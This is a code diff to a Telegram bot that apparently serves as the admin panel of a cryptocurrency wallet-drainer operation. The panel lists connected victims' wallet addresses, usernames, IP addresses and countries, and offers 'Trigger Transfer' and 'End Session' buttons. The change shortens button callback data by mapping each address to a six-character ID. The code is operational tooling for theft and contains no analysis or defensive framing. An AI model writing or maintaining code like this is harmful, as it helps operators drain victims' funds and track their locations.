@@ -32,6 +32,7 @@ class LinkGen(StatesGroup):
 
 AUTHORIZED_ADMINS = set()
 GENERATED_LINKS = {}
+ADDR_MAP = {} # Short ID -> Address
 
 def save_admins():
     with open("admins.json", "w") as f:
@@ -111,23 +112,34 @@ async def list_active_wallets(message: types.Message):
                     return
 
                 for addr, data in wallets.items():
+                    # Map long address to short ID
+                    sid = addr[-6:]
+                    ADDR_MAP[sid] = addr
+
                     user = data.get("user", {})
                     user_info = f"👤 User: {user.get('username', 'N/A')} ({user.get('id', 'N/A')})"
                     text = f"💎 *Wallet Connected*\n\n{user_info}\nAddress: `{addr}`\nIP: `{data.get('ip')}`\nCountry: `{data.get('country')}`"
 
+                    # Use sid to keep callback_data under 64 bytes
                     kb = InlineKeyboardMarkup(inline_keyboard=[
-                        [InlineKeyboardButton(text="🔄 Trigger Transfer", callback_data=f"admin_cmd:trigger_transfer:{addr}")],
-                        [InlineKeyboardButton(text="🔌 End Session", callback_data=f"admin_cmd:disconnect:{addr}")]
+                        [InlineKeyboardButton(text="🔄 Trigger Transfer", callback_data=f"adm:{sid}:trig")],
+                        [InlineKeyboardButton(text="🔌 End Session", callback_data=f"adm:{sid}:disc")]
                     ])
                     await message.answer(text, parse_mode="Markdown", reply_markup=kb)
     except Exception as e:
         await message.answer(f"❌ Error fetching wallets: {e}")
 
-@dp.callback_query(F.data.startswith("admin_cmd:"))
+@dp.callback_query(F.data.startswith("adm:"))
 async def handle_admin_command(callback: types.CallbackQuery):
     if callback.from_user.id not in AUTHORIZED_ADMINS: return
 
-    _, cmd, addr = callback.data.split(":")
+    _, sid, cmd_code = callback.data.split(":")
+    addr = ADDR_MAP.get(sid)
+    if not addr:
+        await callback.answer("❌ Session expired or not found.")
+        return
+
+    cmd = "trigger_transfer" if cmd_code == "trig" else "disconnect"
 
     try:
         async with aiohttp.ClientSession() as session:
